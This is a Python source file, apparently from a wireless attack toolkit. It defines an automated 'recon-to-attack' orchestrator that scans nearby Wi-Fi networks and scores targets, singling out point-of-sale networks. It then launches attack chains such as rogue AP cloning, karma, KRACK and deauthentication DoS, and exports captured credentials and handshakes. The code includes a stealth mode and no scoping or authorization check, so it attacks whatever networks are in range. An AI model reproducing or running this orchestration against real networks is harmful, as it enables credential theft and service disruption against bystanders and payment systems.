"""
Recon-to-Attack Flow Manager
─────────────────────────────
Higher-level orchestrator that manages the complete automated attack lifecycle:

  Phase 0 - Environment Setup:   Detect platform, enable monitor mode, validate
  Phase 1 - Passive Recon:       Run ReconEngine, collect AP/client data
  Phase 2 - Target Analysis:     Score targets, analyze security posture
  Phase 3 - Attack Selection:    Map targets to attack chains
  Phase 4 - Attack Execution:    Launch selected attacks, monitor, adapt
  Phase 5 - Post-Attack:         Collect results, export, cleanup

This provides a fully automated end-to-end flow that wraps the existing
AttackOrchestrator, ReconEngine, and other modules into a single high-level
interface suitable for the 'auto' CLI mode.
"""

import time
import threading
from enum import Enum
from typing import List, Optional, Dict, Any

from .config import (
    IS_WINDOWS, IS_LINUX, CHANNELS_24GHZ, CHANNELS_5GHZ,
    DEFAULT_MONITOR_IFACE, DEFAULT_AP_IFACE, log,
)
from .target_scorer import TargetScorer, ScoredTarget
from .attack_selector import AttackSelector, AttackChain


class FlowPhase(Enum):
    """Current phase of the recon-to-attack flow."""
    IDLE = "idle"
    ENVIRONMENT_SETUP = "environment_setup"
    PASSIVE_RECON = "passive_recon"
    TARGET_ANALYSIS = "target_analysis"
    ATTACK_SELECTION = "attack_selection"
    ATTACK_EXECUTION = "attack_execution"
    POST_ATTACK = "post_attack"
    COMPLETED = "completed"
    FAILED = "failed"


class ReconAttackFlow:
    """
    Fully automated recon-to-attack flow manager.

    Coordinates the entire lifecycle from environment setup through
    post-attack cleanup. Wraps ReconEngine, TargetScorer, AttackSelector,
    and AttackOrchestrator into a single high-level interface.

    Usage:
        flow = ReconAttackFlow(interface="wlan0mon")
        flow.run()  # Blocking: runs entire flow

        # Or step by step:
        flow.setup_environment()
        flow.run_recon(duration=60)
        targets = flow.analyze_targets()
        flow.execute_attacks(targets)
        flow.cleanup()
    """

    def __init__(self, interface: str = None, ap_interface: str = None,
                 duration: int = 300, max_targets: int = 3,
                 stealth: bool = False, use_5ghz: bool = False,
                 plugins_dir: Optional[str] = None,
                 config: Optional[Any] = None):
        """
        Initialize the ReconAttackFlow.

        Args:
            interface: Monitor mode interface name.
            ap_interface: AP/injection interface name.
            duration: Total operation time in seconds.
            max_targets: Maximum number of targets to attack.
            stealth: Use slower/quieter techniques.
            use_5ghz: Include 5GHz channels in scan.
            plugins_dir: Optional directory for additional attack plugins.
            config: Optional ConfigLoader instance for custom settings.
        """
        self.interface = interface or DEFAULT_MONITOR_IFACE
        self.ap_interface = ap_interface or DEFAULT_AP_IFACE
        self.duration = duration
        self.max_targets = max_targets
        self.stealth = stealth
        self.use_5ghz = use_5ghz
        self.plugins_dir = plugins_dir
        self.config = config

        # State tracking
        self.phase = FlowPhase.IDLE
        self.running = False
        self._stop_event = threading.Event()
        self._monitor_manager = None
        self._db = None
        self._recon_engine = None
        self._plugin_loader = None
        self._results: Dict[str, Any] = {
            "targets_found": 0,
            "targets_attacked": 0,
            "credentials_captured": 0,
            "handshakes_captured": 0,
            "duration_actual": 0,
            "phases_completed": [],
            "errors": [],
        }

        # Channels to scan
        self.channels = CHANNELS_24GHZ
        if use_5ghz:
            self.channels = CHANNELS_24GHZ + CHANNELS_5GHZ

        # Components (lazy initialized)
        self._scorer = TargetScorer()
        self._selector = AttackSelector(stealth_mode=stealth)

    @property
    def results(self) -> Dict[str, Any]:
        """Get current results summary."""
        return self._results.copy()

    def run(self) -> Dict[str, Any]:
        """
        Run the complete recon-to-attack flow (blocking).

        Executes all phases sequentially:
          0. Environment setup
          1. Passive recon
          2. Target analysis
          3. Attack selection
          4. Attack execution
          5. Post-attack cleanup

        Returns:
            Results dictionary with statistics from the operation.
        """
        start_time = time.time()
        self.running = True
        self._stop_event.clear()

        log.info("=" * 60)
        log.info("ReconAttackFlow: Starting automated operation")
        log.info(f"  Interface: {self.interface}")
        log.info(f"  Duration: {self.duration}s")
        log.info(f"  Max targets: {self.max_targets}")
        log.info(f"  Stealth: {self.stealth}")
        log.info(f"  5GHz: {self.use_5ghz}")
        log.info("=" * 60)

        try:
            # Phase 0: Environment Setup
            if not self._check_stop():
                if not self.setup_environment():
                    self.phase = FlowPhase.FAILED
                    self._results["errors"].append("Environment setup failed")
                    return self._results

            # Phase 1: Passive Recon
            if not self._check_stop():
                recon_duration = self._calculate_recon_time()
                self.run_recon(duration=recon_duration)

            # Phase 2: Target Analysis
            if not self._check_stop():
                targets = self.analyze_targets()
                if not targets:
                    log.warning("ReconAttackFlow: No viable targets found")
                    self._results["errors"].append("No viable targets found")
                    self.phase = FlowPhase.POST_ATTACK
                    self.cleanup()
                    return self._results

            # Phase 3: Attack Selection
            if not self._check_stop():
                attack_plans = self.select_attacks(targets)

            # Phase 4: Attack Execution
            if not self._check_stop():
                self.execute_attacks(attack_plans)

            # Phase 5: Post-Attack
            self.cleanup()

        except Exception as e:
            log.error(f"ReconAttackFlow: Unhandled error: {e}")
            self._results["errors"].append(str(e))
            self.phase = FlowPhase.FAILED
            self._safe_cleanup()
        finally:
            self.running = False
            self._results["duration_actual"] = int(time.time() - start_time)

        log.info("=" * 60)
        log.info("ReconAttackFlow: Operation complete")
        log.info(f"  Duration: {self._results['duration_actual']}s")
        log.info(f"  Targets found: {self._results['targets_found']}")
        log.info(f"  Targets attacked: {self._results['targets_attacked']}")
        log.info(f"  Credentials: {self._results['credentials_captured']}")
        log.info(f"  Handshakes: {self._results['handshakes_captured']}")
        log.info("=" * 60)

        return self._results

    def stop(self):
        """Signal the flow to stop gracefully."""
        log.info("ReconAttackFlow: Stop signal received")
        self._stop_event.set()
        self.running = False

    # ─── Phase 0: Environment Setup ─────────────────────────────────────────

    def setup_environment(self) -> bool:
        """
        Phase 0: Set up the operating environment.

        - Detect platform (Windows/Linux)
        - Enable monitor mode on the specified interface
        - Validate interface is ready
        - Initialize database
        - Load plugins if configured

        Returns:
            True if environment is ready, False on failure.
        """
        self.phase = FlowPhase.ENVIRONMENT_SETUP
        log.info("[Phase 0] Environment Setup")

        # Platform detection
        if IS_WINDOWS:
            log.info("  Platform: Windows")
        elif IS_LINUX:
            log.info("  Platform: Linux")
        else:
            log.warning("  Platform: Unknown (may have limited functionality)")

        # Initialize database (lazy import to avoid circular deps)
        try:
            from .database import POSDatabase
            self._db = POSDatabase()
            log.info("  Database: initialized")
        except Exception as e:
            log.error(f"  Database initialization failed: {e}")
            return False

        # Set up monitor mode
        if not self._setup_monitor_mode():
            log.error("  Monitor mode setup failed")
            return False

        # Load plugins
        self._load_plugins()

        # Update scorer and selector with dependencies
        self._scorer.set_database(self._db)
        if self._plugin_loader:
            self._selector.set_plugin_loader(self._plugin_loader)

        self._results["phases_completed"].append("environment_setup")
        log.info("[Phase 0] Environment setup complete")
        return True

    def _setup_monitor_mode(self) -> bool:
        """Enable monitor mode on the configured interface."""
        try:
            from .monitor_mode import (
                setup_monitor_mode, LinuxMonitorManager, WindowsMonitorManager
            )

            if IS_WINDOWS:
                self._monitor_manager = WindowsMonitorManager(self.interface)
                success = self._monitor_manager.enable_monitor_mode()
            elif IS_LINUX:
                success, self._monitor_manager = setup_monitor_mode(self.interface)
            else:
                log.warning("  Unsupported platform for monitor mode, proceeding anyway")
                return True

            if success:
                log.info(f"  Monitor mode: enabled on {self.interface}")
                return True
            else:
                log.warning("  Monitor mode: could not enable, attempting to proceed")
                # Some interfaces may already be in monitor mode
                return True

        except Exception as e:
            log.warning(f"  Monitor mode setup error: {e}")
            # Non-fatal: interface may already be in monitor mode
            return True

    def _load_plugins(self):
        """Load plugins if plugin system is available."""
        try:
            from .plugin_system import PluginManager
            from pathlib import Path

            manager = PluginManager()
            dirs_to_scan = []
            if self.plugins_dir:
                dirs_to_scan.append(Path(self.plugins_dir))

            total = 0
            for d in dirs_to_scan:
                if d.is_dir():
                    total += manager.discover(d)

            if total > 0:
                log.info(f"  Plugins: {total} loaded")
            else:
                log.info("  Plugins: none found")
        except Exception as e:
            log.warning(f"  Plugin loading failed: {e}")
            self._plugin_loader = None

    # ─── Phase 1: Passive Recon ──────────────────────────────────────────────

    def run_recon(self, duration: int = 60):
        """
        Phase 1: Run passive reconnaissance.

        Starts the ReconEngine to passively scan for access points
        and clients, populating the database.

        Args:
            duration: Scan duration in seconds.
        """
        self.phase = FlowPhase.PASSIVE_RECON
        log.info(f"[Phase 1] Passive Recon (duration={duration}s)")

        try:
            from .recon import ReconEngine

            self._recon_engine = ReconEngine(
                self.interface, self._db, channels=self.channels
            )

            log.info("  Starting passive scan...")
            self._recon_engine.start(timeout=duration)
            self._recon_engine.stop()

            # Report findings
            stats = self._db.get_stats()
            self._results["targets_found"] = stats.get("access_points", 0)
            log.info(f"  Scan complete: {stats['access_points']} APs "
                     f"({stats['pos_access_points']} POS), "
                     f"{stats['clients']} clients")

        except Exception as e:
            log.error(f"  Recon failed: {e}")
            self._results["errors"].append(f"Recon failed: {e}")

        self._results["phases_completed"].append("passive_recon")
        log.info("[Phase 1] Passive recon complete")

    # ─── Phase 2: Target Analysis ────────────────────────────────────────────

    def analyze_targets(self) -> List[ScoredTarget]:
        """
        Phase 2: Analyze and score discovered targets.

        Queries the database, scores all targets, and returns
        the top candidates for attack.

        Returns:
            List of ScoredTarget objects (top targets by score).
        """
        self.phase = FlowPhase.TARGET_ANALYSIS
        log.info("[Phase 2] Target Analysis")

        # Score all targets
        targets = self._scorer.get_top_targets(max_targets=self.max_targets)

        if not targets:
            log.warning("  No targets scored above threshold")
            return []

        # Log analysis results
        log.info(f"  Analyzed targets: {len(targets)} selected")
        for i, target in enumerate(targets, 1):
            pos_tag = " [POS]" if target.is_pos else ""
            log.info(f"    #{i}: {target.ssid}{pos_tag} "
                     f"(score={target.score:.1f}, rssi={target.rssi}, "
                     f"security={target.security}, clients={target.client_count})")

        self._results["phases_completed"].append("target_analysis")
        log.info("[Phase 2] Target analysis complete")
        return targets

    # ─── Phase 3: Attack Selection ───────────────────────────────────────────

    def select_attacks(self, targets: List[ScoredTarget]) -> List[AttackChain]:
        """
        Phase 3: Select attack chains for each target.

        Maps each scored target to an appropriate attack chain
        based on its security type and characteristics.

        Args:
            targets: List of scored targets from Phase 2.

        Returns:
            List of AttackChain objects ready for execution.
        """
        self.phase = FlowPhase.ATTACK_SELECTION
        log.info("[Phase 3] Attack Selection")

        attack_plans = []
        for target in targets:
            chain = self._selector.select_attack(target)
            attack_plans.append(chain)
            log.info(f"  {target.ssid} -> {chain.strategy_name} "
                     f"({len(chain.steps)} steps)")

        self._results["phases_completed"].append("attack_selection")
        log.info(f"[Phase 3] Attack selection complete: {len(attack_plans)} plans")
        return attack_plans

    # ─── Phase 4: Attack Execution ───────────────────────────────────────────

    def execute_attacks(self, attack_plans: List[AttackChain]):
        """
        Phase 4: Execute the selected attack chains.

        Launches attacks in order, monitors progress, and adapts
        if attacks fail (e.g., switch targets, try different approach).

        Args:
            attack_plans: List of AttackChain objects from Phase 3.
        """
        self.phase = FlowPhase.ATTACK_EXECUTION
        log.info(f"[Phase 4] Attack Execution ({len(attack_plans)} targets)")

        targets_attacked = 0

        for i, plan in enumerate(attack_plans):
            if self._check_stop():
                log.info("  Stop signal received, halting attacks")
                break

            log.info(f"  Target {i+1}/{len(attack_plans)}: {plan.target_ssid}")
            log.info(f"    Strategy: {plan.strategy_name}")

            try:
                success = self._execute_single_chain(plan)
                if success:
                    targets_attacked += 1
                    log.info(f"    Result: SUCCESS")
                else:
                    log.warning(f"    Result: PARTIAL/FAILED")
                    # Adaptive: if attack failed and more targets available, continue
                    if i < len(attack_plans) - 1:
                        log.info("    Adapting: moving to next target")

            except Exception as e:
                log.error(f"    Attack error: {e}")
                self._results["errors"].append(f"Attack on {plan.target_ssid}: {e}")

            # Brief pause between targets (longer in stealth mode)
            if i < len(attack_plans) - 1:
                pause = 10 if self.stealth else 3
                if not self._check_stop():
                    time.sleep(pause)

        self._results["targets_attacked"] = targets_attacked
        self._results["phases_completed"].append("attack_execution")
        log.info(f"[Phase 4] Execution complete: {targets_attacked}/{len(attack_plans)} succeeded")

    def _execute_single_chain(self, chain: AttackChain) -> bool:
        """
        Execute a single attack chain against one target.

        Uses the existing AttackOrchestrator for the actual attack execution,
        configured based on the chain's steps and target info.

        Args:
            chain: AttackChain to execute.

        Returns:
            True if attack succeeded, False otherwise.
        """
        try:
            from .orchestrator import AttackOrchestrator

            # Map chain steps to orchestrator flags
            modules_in_chain = {step.module for step in chain.steps}

            orchestrator = AttackOrchestrator(
                monitor_iface=self.interface,
                ap_iface=self.ap_interface,
                channels=self.channels,
                target_bssid=chain.target_bssid,
                recon_duration=0,  # Skip recon (already done)
                enable_beacons="beacons" in modules_in_chain,
                enable_karma="karma" in modules_in_chain,
                enable_isolation_check=True,
                signal_rssi_limit=-80,
                test_credentials="cred_tester" in modules_in_chain,
                enable_ap_clone="ap_clone" in modules_in_chain,
                enable_krack="krack" in modules_in_chain,
                enable_dos="dos" in modules_in_chain,
                enable_client_isolation="client_isolation" in modules_in_chain,
                enable_printer_attacks="printer_recon" in modules_in_chain,
            )

            # Calculate per-target time budget
            remaining_time = self._get_remaining_time()
            target_budget = min(
                chain.estimated_duration,
                remaining_time // max(1, self.max_targets)
            )

            # Run the orchestrator with a time limit
            log.info(f"    Launching orchestrator (budget={target_budget}s)")
            success = orchestrator.start()

            if success:
                # Wait for the time budget or until stopped
                deadline = time.time() + target_budget
                while orchestrator.running and time.time() < deadline:
                    if self._check_stop():
                        break
                    time.sleep(1)

                orchestrator.stop()

                # Collect results from orchestrator run
                self._collect_attack_results()
                return True
            else:
                log.warning(f"    Orchestrator failed to start for {chain.target_ssid}")
                return False

        except Exception as e:
            log.error(f"    Chain execution error: {e}")
            return False

    def _collect_attack_results(self):
        """Collect results from the database after an attack."""
        if not self._db:
            return

        try:
            stats = self._db.get_stats()
            self._results["credentials_captured"] = stats.get("credentials", 0)
            self._results["handshakes_captured"] = stats.get("eapol_frames", 0)
        except Exception:
            pass

    # ─── Phase 5: Post-Attack ────────────────────────────────────────────────

    def cleanup(self):
        """
        Phase 5: Post-attack cleanup and reporting.

        - Collect final results
        - Export credentials and handshakes
        - Generate report
        - Restore monitor mode / close interfaces
        - Close database
        """
        self.phase = FlowPhase.POST_ATTACK
        log.info("[Phase 5] Post-Attack Cleanup")

        # Collect final results
        self._collect_attack_results()

        # Export results
        try:
            from .post_attack import PostAttackAnalyzer
            if self._db:
                analyzer = PostAttackAnalyzer(self._db)
                analyzer.export_credentials()
                analyzer.export_handshakes()
                analyzer.generate_report("exports/auto_attack_report.json")
                log.info("  Results exported to exports/")
        except Exception as e:
            log.warning(f"  Export failed: {e}")

        # Restore monitor mode / cleanup
        self._restore_interface()

        # Close database
        if self._db:
            try:
                self._db.close()
                log.info("  Database closed")
            except Exception:
                pass
            self._db = None

        self._results["phases_completed"].append("post_attack")
        self.phase = FlowPhase.COMPLETED
        log.info("[Phase 5] Cleanup complete")

    def _restore_interface(self):
        """Restore the network interface to managed mode."""
        try:
            if self._monitor_manager and IS_LINUX:
                from .monitor_mode import teardown_monitor_mode
                teardown_monitor_mode(self.interface)
                log.info("  Interface restored to managed mode")
            elif self._monitor_manager and IS_WINDOWS:
                if hasattr(self._monitor_manager, 'disable_monitor_mode'):
                    self._monitor_manager.disable_monitor_mode()
                    log.info("  Monitor mode disabled")
        except Exception as e:
            log.warning(f"  Interface restoration failed: {e}")

    def _safe_cleanup(self):
        """Emergency cleanup on failure."""
        try:
            if self._recon_engine:
                self._recon_engine.stop()
        except Exception:
            pass

        try:
            self._restore_interface()
        except Exception:
            pass

        try:
            if self._db:
                self._db.close()
                self._db = None
        except Exception:
            pass

    # ─── Utility Methods ─────────────────────────────────────────────────────

    def _calculate_recon_time(self) -> int:
        """
        Calculate how long to spend on recon based on total duration.

        In stealth mode, spends more time on recon (slower scanning).
        """
        if self.stealth:
            # Stealth: 40% of time on recon
            return max(30, int(self.duration * 0.4))
        else:
            # Normal: 20% of time on recon, min 15s
            return max(15, int(self.duration * 0.2))

    def _get_remaining_time(self) -> int:
        """Estimate remaining time in the operation."""
        # Simple estimate based on duration and elapsed phases
        phases_done = len(self._results["phases_completed"])
        # Assume roughly equal time per major phase after recon
        if phases_done >= 3:
            return max(30, int(self.duration * 0.5))
        return max(60, int(self.duration * 0.7))

    def _check_stop(self) -> bool:
        """Check if stop has been signaled."""
        return self._stop_event.is_set()
